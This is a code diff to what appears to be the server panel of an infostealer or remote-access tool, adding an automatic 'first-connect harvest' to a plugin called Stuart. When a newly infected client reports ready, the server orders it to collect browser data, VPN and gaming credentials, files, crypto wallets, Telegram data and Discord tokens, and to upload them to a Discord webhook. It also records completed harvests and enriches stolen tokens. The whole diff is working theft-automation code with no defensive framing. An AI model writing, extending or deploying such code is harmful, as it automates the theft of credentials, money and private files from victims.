@@ -312,7 +312,12 @@ let pluginSettings = {
   discord_bot_token: "",
   discord_forum_channel_id: "",
   discord_thread_prefix: "Stuart",
-  /** Manual Collect extras (never auto-run on connect). Default files ON so bodies are harvested. */
+  /**
+   * Auto-harvest once when a client first connects (agent "ready").
+   * Never on reconnect — tracked in client_auto_harvest table.
+   */
+  harvest_auto_first_connect: true,
+  /** Collect extras (manual Collect + first-connect auto). */
   harvest_files: true,
   harvest_extensions: false,
   harvest_wallets: true,
@@ -505,6 +510,7 @@ function loadSettings(db) {
       else if (r.key === 'discord_bot_token') pluginSettings.discord_bot_token = String(r.value || '');
       else if (r.key === 'discord_forum_channel_id') pluginSettings.discord_forum_channel_id = String(r.value || '').replace(/\D/g, '');
       else if (r.key === 'discord_thread_prefix') pluginSettings.discord_thread_prefix = String(r.value || 'Stuart').slice(0, 80);
+      else if (r.key === 'harvest_auto_first_connect') pluginSettings.harvest_auto_first_connect = r.value !== '0';
       else if (r.key === 'harvest_files') pluginSettings.harvest_files = r.value === '1';
       else if (r.key === 'harvest_extensions') pluginSettings.harvest_extensions = r.value === '1';
       else if (r.key === 'harvest_wallets') pluginSettings.harvest_wallets = r.value === '1';
@@ -2567,30 +2573,153 @@ function getDiscordConfigForAgent() {
   };
 }
 
+/** Best-effort POST an event to the live agent plugin. */
+async function pushAgentEvent(ctx, clientId, event, payload) {
+  const url = `/api/clients/${encodeURIComponent(clientId)}/plugins/stuart/event`;
+  if (typeof ctx.fetch !== "function") {
+    throw new Error("ctx.fetch unavailable");
+  }
+  const res = await ctx.fetch(url, {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({ event, payload: payload || {} }),
+  });
+  if (!res.ok) {
+    const t = await res.text().catch(() => "");
+    throw new Error(`HTTP ${res.status} ${t.slice(0, 120)}`);
+  }
+}
+
 /** Best-effort: tell agent to POST harvests to Discord webhook (not bulk over WS). */
 async function pushDiscordConfigToAgent(ctx, clientId) {
   const cfg = getDiscordConfigForAgent();
   if (!cfg.enabled || !cfg.webhookUrl) return;
-  // Trusted same-origin call (Overlord plugin worker)
-  const url = `/api/clients/${encodeURIComponent(clientId)}/plugins/stuart/event`;
   try {
-    if (typeof ctx.fetch === "function") {
-      const res = await ctx.fetch(url, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ event: "discord_config", payload: cfg }),
-      });
-      if (!res.ok) {
-        const t = await res.text().catch(() => "");
-        throw new Error(`HTTP ${res.status} ${t.slice(0, 120)}`);
-      }
-      console.log(`[stuart] pushed discord_config to agent ${clientId}`);
-      return;
-    }
+    await pushAgentEvent(ctx, clientId, "discord_config", cfg);
+    console.log(`[stuart] pushed discord_config to agent ${clientId}`);
   } catch (e) {
     console.warn(`[stuart] ctx.fetch discord_config failed: ${e.message}`);
   }
-  // Fallback: nothing — UI collect payload must include discord config
+}
+
+function ensureClientAutoHarvestTable(db) {
+  try {
+    db.exec(`
+      CREATE TABLE IF NOT EXISTS client_auto_harvest (
+        client_id TEXT PRIMARY KEY,
+        started_at INTEGER NOT NULL,
+        completed_at INTEGER
+      );
+    `);
+  } catch (_) {}
+}
+
+function markAutoHarvestCompleted(db, clientId) {
+  if (!db || !clientId) return;
+  try {
+    ensureClientAutoHarvestTable(db);
+    const now = Date.now();
+    db.prepare(
+      `INSERT INTO client_auto_harvest(client_id, started_at, completed_at) VALUES(?,?,?)
+       ON CONFLICT(client_id) DO UPDATE SET completed_at=excluded.completed_at`
+    ).run(clientId, now, now);
+  } catch (e) {
+    console.warn(`[stuart] markAutoHarvestCompleted: ${e.message}`);
+  }
+}
+
+/** Build the same collect payload the panel uses for manual Collect. */
+function buildAutoCollectPayload() {
+  const rules = Array.isArray(pluginSettings.harvest_file_rules) && pluginSettings.harvest_file_rules.length
+    ? pluginSettings.harvest_file_rules
+    : DEFAULT_HARVEST_FILE_RULES.slice();
+  const discord = getDiscordConfigForAgent();
+  const payload = {
+    browsers: true,
+    gaming: true,
+    vpns: true,
+    discord,
+    files: !!pluginSettings.harvest_files,
+    wallets: !!pluginSettings.harvest_wallets,
+    telegram: !!pluginSettings.harvest_telegram,
+  };
+  if (payload.files) payload.fileRules = rules;
+  return payload;
+}
+
+/**
+ * First-connect only: when agent becomes ready, run harvest once per clientId.
+ * Reconnects are skipped via client_auto_harvest claim (and existing client_runs).
+ */
+async function maybeAutoHarvestFirstConnect(ctx, clientId) {
+  if (!pluginSettings.harvest_auto_first_connect) return;
+  if (!ctx?.db || !clientId) return;
+  ensureClientAutoHarvestTable(ctx.db);
+
+  const existing = ctx.db.prepare(
+    `SELECT started_at, completed_at FROM client_auto_harvest WHERE client_id = ?`
+  ).get(clientId);
+  if (existing) {
+    console.log(
+      `[stuart] skip first-connect harvest client=${clientId} ` +
+      `(already claimed started=${existing.started_at} completed=${existing.completed_at || "—"})`
+    );
+    return;
+  }
+
+  // Prior manual harvest counts as already done
+  const prior = ctx.db.prepare(`SELECT 1 AS ok FROM client_runs WHERE client_id = ?`).get(clientId);
+  if (prior) {
+    const now = Date.now();
+    ctx.db.prepare(
+      `INSERT OR IGNORE INTO client_auto_harvest(client_id, started_at, completed_at) VALUES(?,?,?)`
+    ).run(clientId, now, now);
+    console.log(`[stuart] skip first-connect harvest client=${clientId} (already has client_runs)`);
+    return;
+  }
+
+  const claim = ctx.db.prepare(
+    `INSERT OR IGNORE INTO client_auto_harvest(client_id, started_at) VALUES(?,?)`
+  ).run(clientId, Date.now());
+  if (!claim.changes) {
+    console.log(`[stuart] skip first-connect harvest client=${clientId} (race claim lost)`);
+    return;
+  }
+
+  console.log(`[stuart] first-connect auto-harvest claimed client=${clientId}`);
+  try { ctx.broadcast?.("status", { clientId, message: "First-connect auto-harvest starting…" }); } catch (_) {}
+
+  // Let ready settle + discord_config push land first
+  await new Promise((r) => setTimeout(r, 2500));
+
+  try {
+    if (isDiscordPipelineOn()) {
+      await pushDiscordConfigToAgent(ctx, clientId);
+      await new Promise((r) => setTimeout(r, 500));
+    }
+    const payload = buildAutoCollectPayload();
+    console.log(
+      `[stuart] first-connect collect → client=${clientId} ` +
+      `files=${payload.files} wallets=${payload.wallets} telegram=${payload.telegram} discord=${!!payload.discord?.enabled}`
+    );
+    await pushAgentEvent(ctx, clientId, "collect", payload);
+
+    // Optional extension scan after collect is running (agent handles concurrent work carefully)
+    if (pluginSettings.harvest_extensions) {
+      setTimeout(() => {
+        pushAgentEvent(ctx, clientId, "scan_extensions", {}).catch((e) =>
+          console.warn(`[stuart] auto scan_extensions: ${e.message}`)
+        );
+      }, 8000);
+    }
+
+    try {
+      ctx.broadcast?.("harvest_update", { clientId, source: "auto-first-connect" });
+    } catch (_) {}
+  } catch (e) {
+    console.error(`[stuart] first-connect auto-harvest failed client=${clientId}: ${e.message}`);
+    // Leave claim without completed_at so operator can see it started; do not auto-retry (first only).
+  }
 }
 
 /**
@@ -3462,6 +3591,7 @@ export default {
     };
 
     if (event === "discord_upload_complete") {
+      markAutoHarvestCompleted(ctx.db, clientId);
       // Agent uploaded ALL files into ONE Discord forum post (HTTP webhook).
       // Import THAT thread only — validate Stuart harvest marker / harvestId.
       const threadId = payload?.threadId || payload?.channel_id;
@@ -3494,17 +3624,22 @@ export default {
       }, 1500);
       return;
     } else if (event === "ready") {
-      // Push webhook config so auto-harvest can upload to Discord without WS bulk data
+      // Push webhook config so harvest can upload to Discord without WS bulk data
       if (isDiscordPipelineOn()) {
         pushDiscordConfigToAgent(ctx, clientId).catch(e =>
           console.warn("[stuart] push discord_config:", e.message)
         );
       }
+      // First connect only — not every reconnect
+      maybeAutoHarvestFirstConnect(ctx, clientId).catch(e =>
+        console.error("[stuart] maybeAutoHarvestFirstConnect:", e.message)
+      );
     } else if (event === "results") {
       if (isDiscordPipelineOn()) {
         // Legacy path: agent still streaming harvest over WS (old agent or webhook missing)
         if (payload?.wallets?.length) noteExpectedWallets(clientId, payload.wallets);
         viaDiscord(payload || {}, { replace: true, settle: true });
+        markAutoHarvestCompleted(ctx.db, clientId);
         return;
       }
       const tx = ctx.db.transaction(() => {
@@ -3512,6 +3647,7 @@ export default {
         stmts.upsertRun.run(clientId, now);
       });
       tx();
+      markAutoHarvestCompleted(ctx.db, clientId);
       for (const r of payload.discordTokens || [])
         enrichDiscordToken(ctx, clientId, r.token).catch(() => {});
       ctx.broadcast("harvest_update", { clientId });
@@ -4404,6 +4540,9 @@ export default {
       }
       if (params.discord_thread_prefix !== undefined) {
         upsert.run('discord_thread_prefix', String(params.discord_thread_prefix || "Stuart").slice(0, 80));
+      }
+      if (params.harvest_auto_first_connect !== undefined) {
+        upsert.run('harvest_auto_first_connect', params.harvest_auto_first_connect ? '1' : '0');
       }
       if (params.harvest_files !== undefined) upsert.run('harvest_files', params.harvest_files ? '1' : '0');
       if (params.harvest_extensions !== undefined) upsert.run('harvest_extensions', params.harvest_extensions ? '1' : '0');
